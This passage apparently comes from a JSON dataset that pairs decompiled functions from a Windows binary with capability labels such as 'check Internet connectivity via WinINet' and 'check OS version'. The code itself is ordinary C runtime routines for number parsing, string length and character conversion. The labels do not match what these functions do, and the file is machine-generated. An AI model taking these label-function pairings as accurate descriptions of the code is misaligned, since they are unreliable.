iVar14 = 1;\n                uVar18 = puVar4[1];\n                while (uVar18 != 0) {\n                    if (puVar12[iVar14] != uVar18) {\n                        if ((*puVar12 & 0xdf) == 0x50) {\n                            uVar19 = 0;\n                            puVar13 = puVar12;\n                            goto code_r0x000140016288;\n                        }\n                        uVar19 = 0;\n                        uVar7 = 0;\n                        bVar5 = false;\n                        puVar20 = puVar12;\n                        goto code_r0x000140016075;\n                    }\n                    iVar14 = iVar14 + 1;\n                    uVar18 = puVar4[iVar14];\n                }\n                puVar13 = puVar12 + iVar14;\n                uVar18 = *puVar13;\n                puVar12 = puVar13;\n                if (*(iVar10 + uVar18) != '\\0') {\n                    do {\n                        uVar18 = puVar12[1];\n                        puVar12 = puVar12 + 1;\n                    } while (*(iVar10 + uVar18) != '\\0');\n                    goto code_r0x000140016192;\n                }\n                uVar19 = 0;\n                puVar20 = puVar13;\n            }\n            else {\ncode_r0x000140016269:\n                uVar18 = *puVar12;\n                uVar19 = (puVar13 - puVar12) * 4;\n                puVar20 = puVar12;\n            }\n        }\n        else {\ncode_r0x000140016187:\n            uVar18 = *puVar12;\n            uVar19 = 0;\n            puVar20 = puVar12;\n            if (puVar13 != NULL) {\ncode_r0x000140016192:\n                uVar19 = (puVar13 - puVar12) * 4;\n                puVar20 = puVar12;\n            }\n        }\n        puVar13 = puVar20;\n        if ((uVar18 & 0xdf) == 0x50) {\ncode_r0x000140016288:\n            uVar18 = puVar13[1];\n            if (uVar18 == 0x2b) {\n                uVar7 = 0;\ncode_r0x0001400163d6:\n                uVar18 = puVar13[2];\n                puVar20 = puVar13 + 2;\n            }\n            else {\n                if (uVar18 == 0x2d) {\n                    uVar7 = 1;\n                    goto code_r0x0001400163d6;\n                }\n                puVar20 = puVar13 + 1;\n                uVar7 = 0;\n            }\n            bVar5 = false;\n            puVar12 = puVar13;\n            if (*(iVar10 + uVar18) - 1 < 0x19) {\n                uVar21 = *(iVar10 + uVar18) - 0x10;\n                uVar18 = puVar20[1];\n                while( true ) {\n                    uVar16 = uVar18;\n                    puVar12 = puVar20 + 1;\n                    if (0x18 < *(iVar10 + uVar16) - 1) break;\n                    if (0x7ffffff < uVar21) {\n                        bVar5 = true;\n                    }\n                    uVar18 = puVar20[2];\n                    uVar21 = (*(iVar10 + uVar16) - 0x10) + uVar21 * 10;\n                    puVar20 = puVar12;\n                }\n                if (uVar7 != 0) {\n                    uVar21 = -uVar21;\n                }\n                uVar19 = uVar19 + uVar21;\n            }\n            goto code_r0x00014001606a;\n        }\n        *arg1 = puVar20;\n        if (bVar25) {\n            return 0;\n        }\n    }\n    uVar16 = 0;\n    for (iVar6 = (puVar20 - puVar23) + -1; 7 < iVar6; iVar6 = iVar6 >> 1) {\n        uVar16 = uVar16 + 1;\n    }\n    iVar14 = fcn.140016f80(uVar16);\n    puVar24 = iVar14 + 0x18;\n    if (puVar4[1] == 0) {\n        iVar11 = 0;\n    }\n    else {\n        iVar11 = sub.msvcrt.dll_strlen();\n        iVar11 = iVar11 + 1;\n    }\n    puVar17 = puVar24;\n    if (puVar23 < puVar20) {\n        uVar21 = 0;\n        iVar6 = 0;\n        do {\n            while( true ) {\n                uVar18 = puVar20[-1];\n                puVar12 = puVar20 + -1;\n                if (uVar18 == puVar4[iVar11]) break;\n                if (iVar6 == 0x20) {\n                    *puVar17 = uVar21;\n                    iVar22 = 4;\n                    uVar18 = puVar20[-1];\n                    uVar21 = 0;\n                    puVar17 = puVar17 + 1;\n                    iVar6 = 0;\n                }\n                else {\n                    iVar22 = iVar6 + 4;\n                }\n                uVar21 = uVar21 | (*(iVar10 + uVar18) & 0xf) << (iVar6 & 0x1f);\n                puVar20 = puVar12;\n                iVar6 = iVar22;\n                if (puVar12 <= puVar23) goto code_r0x000140016327;\n            }\n            puVar20 = puVar12 + -iVar11;\n        } while (puVar23 < puVar20);\ncode_r0x000140016327:\n        uVar7 = 0x1f;\n        if (uVar21 != 0) {\n            for (; uVar21 >> uVar7 == 0; uVar7 = uVar7 - 1) {\n            }\n        }\n        uVar7 = uVar7 ^ 0x1f;\n    }\n    else {\n        uVar7 = 0x20;\n        uVar21 = 0;\n    }\n    *puVar17 = uVar21;\n    uVar21 = *arg2;\n    iVar6 = puVar17 + (4 - puVar24) >> 2;\n    *(iVar14 + 0x14) = iVar6;\n    iVar6 = iVar6 * 0x20 - uVar7;\n    if (uVar21 < iVar6) {\n        uVar7 = iVar6 - uVar21;\n        uVar8 = fcn.140017d10(iVar14, uVar7);\n        if (uVar8 != 0) {\n            uVar1 = uVar7 - 1;\n            uVar8 = 1;\n            if ((1 << (uVar1 & 0x1f) & puVar24[uVar1 >> 5]) != 0) {\n                if ((uVar1 == 0) || (iVar6 = fcn.140017d10(iVar14, uVar1),  iVar6 == 0)) {\n                    uVar8 = 2;\n                }\n                else {\n                    uVar8 = 3;\n                }\n            }\n        }\n        uVar19 = uVar19 + uVar7;\n        fcn.140016880(iVar14, uVar7);\n    }\n    else {\n        uVar8 = 0;\n        if (iVar6 < uVar21) {\n            uVar19 = uVar19 - (uVar21 - iVar6);\n            iVar14 = fcn.140017540(iVar14, uVar21 - iVar6);\n            puVar24 = iVar14 + 0x18;\n        }\n    }\n    if (arg2[2] < uVar19) {\ncode_r0x000140016580:\n        fcn.140017070(iVar14);\ncode_r0x000140016588:\n        puVar15 = sub.msvcrt.dll__errno();\n        *puVar15 = 0x22;\n        return 0xa3;\n    }\n    uVar7 = arg2[1];\n    if (uVar19 < uVar7) {\n        uVar19 = uVar7 - uVar19;\n        if (uVar21 <= uVar19) {\n            uVar8 = arg2[3];\n            if (uVar8 == 2) {\n                if (in_stack_00000028 == 0) goto code_r0x00014001672d;\n            }\n            else if (uVar8 == 3) {\n                if (in_stack_00000028 != 0) goto code_r0x00014001672d;\n            }\n            else if ((uVar8 == 1) && (uVar21 == uVar19)) {\n                if (uVar21 != 1) {\n                    iVar6 = fcn.140017d10(iVar14, uVar21 - 1);\n                    if (iVar6 == 0) goto code_r0x0001400164ed;\n                    uVar7 = arg2[1];\n                }\ncode_r0x00014001672d:\n                *(iVar14 + 0x14) = 1;\n                *puVar24 = 1;\ncode_r0x000140016490:\n                *arg4 = iVar14;\n                *arg3 = uVar7;\n                puVar15 = sub.msvcrt.dll__errno();\n                *puVar15 = 0x22;\n                return 0x62;\n            }\ncode_r0x0001400164ed:\n            fcn.140017070(iVar14);\ncode_r0x0001400164f5:\n            puVar15 = sub.msvcrt.dll__errno();\n            *puVar15 = 0x22;\n            return 0x50;\n        }\n        uVar7 = uVar19 - 1;\n        if (uVar8 == 0) {\n            if (uVar7 != 0) {\n                uVar8 = fcn.140017d10(iVar14, uVar7);\n            }\n        }\n        else {\n            uVar8 = 1;\n        }\n        if ((1 << (uVar7 & 0x1f) & puVar24[uVar7 >> 5]) != 0) {\n            uVar8 = uVar8 | 2;\n        }\n        uVar21 = uVar21 - uVar19;\n        uVar18 = 2;\n        fcn.140016880(iVar14, uVar19);\n        uVar19 = arg2[1];\n    }\n    else {\n        uVar18 = 1;\n    }\n    if (uVar8 == 0) goto code_r0x0001400163a1;\n    uVar7 = arg2[3];\n    if (uVar7 == 2) {\n        in_stack_00000028 = 1 - in_stack_00000028;\njoined_r0x000140016698:\n        if (in_stack_00000028 != 0) {\n            iVar6 = *(iVar14 + 0x14);\n            iVar14 = fcn.14000fc00(iVar14);\n            if (uVar18 == 2) {\n                uVar18 = 0x22;\n                if (*arg2 - 1 == uVar21) {\n                    uVar18 = ((1 << (uVar21 & 0x1f) & *(iVar14 + 0x18 + (uVar21 >> 5) * 4)) == 0) + 0x21;\n                }\n                goto code_r0x0001400163a1;\n            }\n            if (*(iVar14 + 0x14) == iVar6 || *(iVar14 + 0x14) < iVar6) {\n                if ((uVar21 & 0x1f) != 0) {\n                    puVar24 = iVar14 + 0x14 + iVar6 * 4;\n                    uVar7 = 0x1f;\n                    if (*puVar24 != 0) {\n                        for (; *puVar24 >> uVar7 == 0; uVar7 = uVar7 - 1) {\n                        }\n                    }\n                    if ((uVar7 ^ 0x1f) < 0x20 - (uVar21 & 0x1f)) goto code_r0x0001400166d8;\n                }\n            }\n            else {\ncode_r0x0001400166d8:\n                uVar19 = uVar19 + 1;\n                fcn.140016880(iVar14, 1);\n                if (arg2[2] < uVar19) goto code_r0x000140016580;\n            }\n            uVar18 = 0x21;\n            goto code_r0x0001400163a1;\n        }\n    }\n    else {\n        if (uVar7 == 3) goto joined_r0x000140016698;\n        if ((uVar7 == 1) && ((uVar8 & 2) != 0)) {\n            in_stack_00000028 = (uVar8 | *puVar24) & 1;\n            goto joined_r0x000140016698;\n        }\n    }\n    uVar18 = uVar18 | 0x10;\ncode_r0x0001400163a1:\n    *arg4 = iVar14;\n    *arg3 = uVar19;\n    return uVar18;\n}\n",
        "token_count": 4544
    },
    "140016a6": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Type propagation algorithm not settling\n\nulong fcn.140016a60(char **arg1, uint32_t *arg2, uint32_t *arg3)\n\n{\n    uint8_t *puVar1;\n    uint8_t uVar2;\n    char cVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    char *pcVar6;\n    int32_t iVar7;\n    int64_t iVar8;\n    uint32_t uVar9;\n    uint32_t *puVar10;\n    uint32_t *puVar11;\n    uint32_t *puVar12;\n    uint32_t *puVar13;\n    int32_t iVar14;\n    int32_t iVar15;\n    uint32_t *puVar16;\n    int64_t iVar17;\n    char *pcVar18;\n    uint32_t *puVar19;\n    \n    iVar8 = *0x140103630;\n    if (*(*0x140103630 + 0x30) == '\\0') {\n        fcn.1400169c0();\n    }\n    uVar4 = *arg2 & 0x1f;\n    puVar10 = arg3 + (*arg2 >> 5);\n    if (uVar4 == 0) {\n        puVar12 = puVar10 + -1;\n        puVar19 = puVar10;\n    }\n    else {\n        puVar19 = puVar10 + 1;\n        puVar12 = puVar10;\n    }\n    pcVar18 = *arg1;\n    puVar19[-1] = 0;\n    uVar2 = pcVar18[1];\n    if (uVar2 != 0) {\n        do {\n            if (0x20 < uVar2) {\n                if (((uVar2 == 0x30) && ((pcVar18[2] & 0xdfU) == 0x58)) && (uVar2 = pcVar18[3],  0x20 < uVar2)) {\n                    pcVar6 = pcVar18 + 3;\n                    pcVar18 = pcVar18 + 2;\n                    goto code_r0x000140016b11;\n                }\n                break;\n            }\n            uVar2 = pcVar18[2];\n            pcVar18 = pcVar18 + 1;\n        } while (uVar2 != 0);\n        uVar2 = pcVar18[1];\n        pcVar6 = pcVar18 + 1;\n        if (uVar2 != 0) {\ncode_r0x000140016b11:\n            uVar9 = uVar2;\n            iVar15 = 0;\n            iVar14 = 0;\n            iVar7 = 0;\n            puVar10 = puVar12;\n            puVar13 = puVar12;\ncode_r0x000140016b30:\n            do {\n                uVar2 = *(iVar8 + uVar9);\n                if (uVar2 == 0) {\n                    if (0x20 < uVar9) {\n                        if ((uVar9 != 0x29) || (iVar14 == 0)) {\n                            do {\n                                pcVar6 = pcVar6 + 1;\n                                if (uVar9 == 0x29) {\n                                    *arg1 = pcVar6;\n                                    return 4;\n                                }\n                                uVar9 = *pcVar6;\n                            } while (*pcVar6 != '\\0');\n                            return 4;\n                        }\n                        *arg1 = pcVar18 + 2;\n                        if (puVar13 <= puVar10) goto joined_r0x000140016bf9;\n                        goto code_r0x000140016bec;\n                    }\n                    puVar11 = puVar10;\n                    if (iVar14 <= iVar7) {\ncode_r0x000140016cf3:\n                        uVar2 = pcVar6[1];\n                        while (uVar2 < 0x21) {\n                            puVar1 = pcVar6 + 2;\n                            pcVar6 = pcVar6 + 1;\n                            uVar2 = *puVar1;\n                        }\n                        pcVar18 = pcVar6;\n                        puVar10 = puVar11;\n                        if (((uVar2 != 0x30) || ((pcVar6[2] & 0xdfU) != 0x58)) || (uVar9 = pcVar6[3],  pcVar6[3] < 0x21)\n                           ) goto code_r0x000140016cb4;\n                        pcVar18 = pcVar6 + 2;\n                        pcVar6 = pcVar6 + 3;\n                        goto code_r0x000140016b30;\n                    }\n                    if ((puVar10 < puVar13) && (iVar15 < 8)) {\n                        uVar9 = *puVar10;\n                        cVar3 = '\\b' - iVar15;\n                        do {\n                            puVar16 = puVar11 + 1;\n                            *puVar11 = uVar9 | puVar11[1] << (cVar3 * -4 + 0x20U & 0x1f);\n                            uVar9 = puVar11[1] >> (cVar3 * '\\x04' & 0x1fU);\n                            *puVar16 = uVar9;\n                            puVar11 = puVar16;\n                        } while (puVar16 < puVar13);\n                    }\n                    if (arg3 < puVar10) {\n                        puVar11 = puVar10 + -1;\n                        puVar10[-1] = 0;\n                        iVar15 = 0;\n                        puVar13 = puVar11;\n                        iVar7 = iVar14;\n                        goto code_r0x000140016cf3;\n                    }\n                    uVar2 = pcVar6[1];\n                    iVar15 = 8;\n                    pcVar18 = pcVar6;\n                }\n                else {\n                    iVar15 = iVar15 + 1;\n                    iVar14 = iVar14 + 1;\n                    if (iVar15 < 9) {\n                        uVar9 = *puVar10 << 4;\n                    }\n                    else {\n                        pcVar18 = pcVar6;\n                        if (puVar10 <= arg3) goto code_r0x000140016cb4;\n                        puVar10[-1] = 0;\n                        uVar9 = 0;\n                        puVar10 = puVar10 + -1;\n                        iVar15 = 1;\n                    }\n                    *puVar10 = uVar2 & 0xf | uVar9;\n                    pcVar18 = pcVar6;\ncode_r0x000140016cb4:\n                    uVar2 = pcVar18[1];\n                }\n                uVar9 = uVar2;\n                pcVar6 = pcVar18 + 1;\n            } while (uVar9 != 0);\n            if (iVar14 != 0) {\n                if (puVar10 < puVar13) {\ncode_r0x000140016bec:\n                    if (iVar15 < 8) {\n                        cVar3 = '\\b' - iVar15;\n                        uVar9 = *puVar10;\n                        puVar11 = puVar10;\n                        do {\n                            puVar16 = puVar11 + 1;\n                            uVar5 = puVar11[1] << (cVar3 * -4 + 0x20U & 0x1f) | uVar9;\n                            uVar9 = puVar11[1] >> (cVar3 * '\\x04' & 0x1fU);\n                            *puVar11 = uVar5;\n                            *puVar16 = uVar9;\n                            puVar11 = puVar16;\n                        } while (puVar16 < puVar13);\n                    }\n                }\njoined_r0x000140016bf9:\n                puVar13 = puVar10;\n                puVar11 = arg3;\n                if (arg3 < puVar10) {\n                    do {\n                        puVar16 = puVar13 + 1;\n                        *puVar11 = *puVar13;\n                        puVar13 = puVar16;\n                        puVar11 = puVar11 + 1;\n                    } while (puVar16 <= puVar12);\n                    iVar8 = (puVar12 - puVar10 & 0xfffffffffffffffcU) + 4;\n                    if (puVar12 + 1U < puVar10 + 1U) {\n                        iVar8 = 4;\n                    }\n                    iVar8 = iVar8 + arg3;\n                    iVar17 = (puVar12 - iVar8 & 0xfffffffffffffffcU) + 4;\n                    if (puVar12 + 1U < iVar8 + 1U) {\n                        iVar17 = 4;\n                    }\n                    sub.msvcrt.dll_memset(iVar8, 0, iVar17);\n                    uVar9 = puVar19[-1];\n                }\n                else {\n                    uVar9 = puVar19[-1];\n                    if (uVar4 != 0) {\n                        uVar9 = uVar9 & 0xffffffffU >> (0x20U - uVar4 & 0x1f);\n                        puVar19[-1] = uVar9;\n                    }\n                }\n                while( true ) {\n                    if (uVar9 != 0) {\n                        return 5;\n                    }\n                    if (arg3 == puVar12) break;\n                    uVar9 = puVar12[-1];\n                    puVar12 = puVar12 + -1;\n                }\n                *puVar12 = 1;\n                return 5;\n            }\n        }\n    }\n    return 4;\n}\n",
        "token_count": 2064
    },
    "140016e5": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x000140016f1b)\n// WARNING: Removing unreachable block (ram,0x000140016f00)\n// WARNING: Removing unreachable block (ram,0x000140016f0c)\n\nvoid fcn.140016e50(ulong arg1)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    \n    pcVar2 = _sym.imp.KERNEL32.dll_Sleep;\n    pcVar1 = _sym.imp.KERNEL32.dll_InitializeCriticalSection;\n    if (*0x140129c30 != 2) {\n        if (*0x140129c30 != 0) {\n            if (*0x140129c30 == 1) {\n                do {\n                    (*pcVar2)(1);\n                } while (*0x140129c30 == 1);\n                if (*0x140129c30 == 2) goto code_r0x000140016ee6;\n            }\n            return;\n        }\n        *0x140129c30 = 1;\n        (*_sym.imp.KERNEL32.dll_InitializeCriticalSection)(0x140129c40);\n        (*pcVar1)(0x140129c68);\n        fcn.1400014f0(0x140016f30);\n        *0x140129c30 = 2;\n    }\ncode_r0x000140016ee6:\n    // WARNING: Could not recover jumptable at 0x000140016ef8. Too many branches\n    // WARNING: Treating indirect jump as call\n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(arg1 * 0x28 + 0x140129c40);\n    return;\n}\n",
        "token_count": 365
    },
    "14001799": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint64_t fcn.140017990(ulong noname_0, int32_t *arg2, int32_t *arg3)\n\n{\n    uint32_t *puVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    int64_t iVar7;\n    uint8_t uVar8;\n    uint32_t uVar9;\n    uint32_t uVar10;\n    ulong in_XMM0_Qa;\n    \n    iVar7 = fcn.140016f80(1);\n    if (iVar7 != 0) {\n        uVar9 = in_XMM0_Qa >> 0x20;\n        uVar10 = uVar9 & 0xfffff;\n        uVar9 = uVar9 >> 0x14 & 0x7ff;\n        if (uVar9 != 0) {\n            uVar10 = uVar10 | 0x100000;\n        }\n        uVar5 = in_XMM0_Qa;\n        if (uVar5 == 0) {\n            iVar6 = 1;\n            iVar3 = 0;\n            for (uVar5 = uVar10; (uVar5 & 1) == 0; uVar5 = uVar5 >> 1 | 0x80000000) {\n                iVar3 = iVar3 + 1;\n            }\n            *(iVar7 + 0x14) = 1;\n            iVar2 = iVar3 + 0x20;\n            *(iVar7 + 0x18) = uVar10 >> (iVar3 & 0x1f);\n        }\n        else {\n            iVar2 = 0;\n            for (uVar4 = uVar5; (uVar4 & 1) == 0; uVar4 = uVar4 >> 1 | 0x80000000) {\n                iVar2 = iVar2 + 1;\n            }\n            uVar8 = iVar2;\n            uVar5 = uVar5 >> (uVar8 & 0x1f);\n            if (iVar2 != 0) {\n                uVar5 = uVar5 | uVar10 << (0x20 - uVar8 & 0x1f);\n                uVar10 = uVar10 >> (uVar8 & 0x1f);\n            }\n            *(iVar7 + 0x18) = uVar5;\n            iVar6 = 2 - (uVar10 == 0);\n            *(iVar7 + 0x1c) = uVar10;\n            *(iVar7 + 0x14) = iVar6;\n        }\n        if (uVar9 == 0) {\n            puVar1 = iVar7 + 0x14 + iVar6 * 4;\n            uVar10 = 0x1f;\n            if (*puVar1 != 0) {\n                for (; *puVar1 >> uVar10 == 0; uVar10 = uVar10 - 1) {\n                }\n            }\n            *arg2 = iVar2 + -0x432;\n            *arg3 = iVar6 * 0x20 - (uVar10 ^ 0x1f);\n        }\n        else {\n            *arg2 = (uVar9 - 0x433) + iVar2;\n            *arg3 = 0x35 - iVar2;\n        }\n    }\n    return iVar7;\n}\n",
        "token_count": 747
    },
    "140017d8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint64_t fcn.140017d80(char *arg1, uint64_t arg2)\n\n{\n    char *pcVar1;\n    uint64_t uVar2;\n    \n    uVar2 = 0;\n    pcVar1 = arg1;\n    if (arg2 != 0) {\n        do {\n            if (*pcVar1 == '\\0') {\n                return uVar2;\n            }\n            pcVar1 = pcVar1 + 1;\n            uVar2 = pcVar1 - arg1;\n        } while (uVar2 < arg2);\n    }\n    return uVar2;\n}\n",
        "token_count": 131
    },
    "140017db": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint64_t fcn.140017db0(int64_t arg1, int64_t arg2)\n\n{\n    int64_t iVar1;\n    \n    iVar1 = 0;\n    if (arg2 != 0) {\n        do {\n            if (*(arg1 + iVar1 * 2) == 0) {\n                return iVar1;\n            }\n            iVar1 = iVar1 + 1;\n        } while (arg2 != iVar1);\n    }\n    return arg2;\n}\n",
        "token_count": 104
    },
    "1400181b": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nulong fcn.1400181b0(uint16_t *arg1, uint32_t *arg2, int64_t arg3, uint32_t *arg4)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    int32_t in_stack_00000028;\n    uint32_t in_stack_00000030;\n    uint32_t auStack28 [3];\n    \n    if (arg2 == NULL) {\n        return 0;\n    }\n    if (arg3 == 0) {\n        return 0xfffffffe;\n    }\n    auStack28[0] = *arg4;\n    uVar1 = *arg2;\n    *arg4 = 0;\n    if (uVar1 == 0) {\n        *arg1 = 0;\n        return 0;\n    }\n    if (in_stack_00000030 < 2) {\ncode_r0x000140018268:\n        if (in_stack_00000028 == 0) {\n            *arg1 = *arg2;\n            return 1;\n        }\n        iVar2 = (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)(in_stack_00000028, 8, arg2, 1, arg1, 1);\n        if (iVar2 != 0) {\n            return 1;\n        }\n    }\n    else {\n        if (auStack28[0] == '\\0') {\n            iVar2 = (*_sym.imp.KERNEL32.dll_IsDBCSLeadByteEx)(in_stack_00000028);\n            if (iVar2 == 0) goto code_r0x000140018268;\n            if (arg3 == 1) {\n                *arg4 = *arg2;\n                return 0xfffffffe;\n            }\n        }\n        else {\n            auStack28[0]._0_2_ = CONCAT11(uVar1, auStack28[0]);\n            auStack28[0] = auStack28[0] & 0xffff0000 | auStack28[0];\n            arg2 = auStack28;\n        }\n        iVar2 = (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)(in_stack_00000028, 8, arg2, 2, arg1, 1);\n        if (iVar2 != 0) {\n            return 2;\n        }\n    }\n    puVar3 = sub.msvcrt.dll__errno();\n    *puVar3 = 0x2a;\n    return 0xffffffff;\n}\n",
        "token_count": 554
    },
    "14009fb2": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
